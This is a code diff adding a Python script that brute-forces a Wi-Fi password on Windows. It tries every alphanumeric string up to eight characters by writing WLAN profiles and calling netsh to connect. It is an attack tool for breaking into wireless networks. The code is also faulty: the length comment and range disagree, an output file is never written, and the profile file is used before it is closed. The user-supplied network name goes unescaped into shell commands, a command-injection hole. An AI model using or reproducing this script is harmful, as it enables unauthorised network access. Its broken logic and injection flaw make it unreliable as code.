@@ -1,0 +1,70 @@
+import os
+import itertools
+
+def generate_combinations(wifi_name):
+    characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
+    total_count = 0  # Initialize counter for total passwords generated
+
+    # Generate combinations of length 9
+    with open('combinations.txt', 'w') as file:
+        for length in range(9):
+            for combination in itertools.product(characters, repeat=length):
+                password = ''.join(combination)
+                print(password + '\n')
+                
+                # Establish a new connection
+                create_new_connection(wifi_name, password)
+
+                total_count += 1  # Increment the counter for each password generated
+
+    return total_count
+
+def create_new_connection(wifi_name, password):
+    SSID = wifi_name
+    
+    config = f"""<?xml version=\"1.0\"?>
+<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
+    <name>{wifi_name}</name>
+    <SSIDConfig>
+        <SSID>
+            <name>{SSID}</name>
+        </SSID>
+    </SSIDConfig>
+    <connectionType>ESS</connectionType>
+    <connectionMode>auto</connectionMode>
+    <MSM>
+        <security>
+            <authEncryption>
+                <authentication>WPA2PSK</authentication>
+                <encryption>AES</encryption>
+                <useOneX>false</useOneX>
+            </authEncryption>
+            <sharedKey>
+                <keyType>passPhrase</keyType>
+                <protected>false</protected>
+                <keyMaterial>{password}</keyMaterial>
+            </sharedKey>
+        </security>
+    </MSM>
+</WLANProfile>"""
+    
+    command = f"netsh wlan add profile filename=\"{wifi_name}.xml\" interface=Wi-Fi"
+    with open(f"{wifi_name}.xml", 'w') as file:
+        file.write(config)
+        os.system(command)
+    
+    # Connect to the wifi network
+    connect(wifi_name, SSID)
+
+def connect(name, SSID):
+    command = f"netsh wlan connect name=\"{name}\" ssid=\"{SSID}\" interface=Wi-Fi"
+    os.system(command)
+
+def display_available_networks():
+    command = "netsh wlan show networks interface=Wi-Fi"
+    os.system(command)
+
+if __name__ == "__main__":
+    wifi_name = input("Name of Wi-Fi: ")
+    total_count = generate_combinations(wifi_name)
+    print(f"Tried all combinations: {total_count}")
